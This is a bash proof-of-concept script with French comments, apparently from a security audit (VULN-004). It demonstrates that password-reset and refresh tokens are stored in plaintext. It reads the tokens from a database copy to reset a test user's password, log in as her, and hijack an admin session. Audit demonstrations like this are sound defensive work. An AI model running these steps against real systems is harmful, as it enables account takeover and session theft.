#!/usr/bin/env bash
# VULN-004 — PoC : tokens secrets stockés en clair en base (lecture de la base = prise de compte)
# Hypothèse de l'attaquant : il a obtenu une copie de la base (sauvegarde, fichier .db, accès lecture).
source "$(dirname "$0")/../outils/common.sh"
setup_accounts

echo "=== 1. L'attaquant demande un reset du mot de passe d'Alice (il n'a pas accès à sa boîte mail)"
post /auth/forgot-password '{"email":"alice@corp.test"}'
echo

echo
echo "=== 2. Il lit la table PasswordReset dans la copie de la base"
echo "\$ sqlite3 audit.db \"SELECT token FROM PasswordReset;\""
RESET_TOKEN=$(sql "SELECT token FROM PasswordReset ORDER BY id DESC LIMIT 1;")
echo "$RESET_TOKEN"

echo
echo "=== 3. Il utilise ce token pour choisir le nouveau mot de passe d'Alice"
post /auth/reset-password "{\"token\":\"$RESET_TOKEN\",\"password\":\"Hacked123!\"}" -w "\nHTTP %{http_code}\n"

echo
echo "=== 4. Il se connecte au compte d'Alice"
post /auth/login '{"email":"alice@corp.test","password":"Hacked123!"}' -w "\nHTTP %{http_code}\n" | short

echo
echo "=== Variante : vol de session via la table RefreshToken"
echo "\$ sqlite3 audit.db \"SELECT token FROM RefreshToken WHERE userId = <admin>;\""
ADMIN_ID=$(sql "SELECT id FROM User WHERE email = 'admin@corp.test';")
STOLEN=$(sql "SELECT token FROM RefreshToken WHERE userId = $ADMIN_ID AND revokedAt IS NULL LIMIT 1;")
echo "$STOLEN" | short
post /auth/refresh "{\"refreshToken\":\"$STOLEN\"}" -w "\nHTTP %{http_code}\n" | short
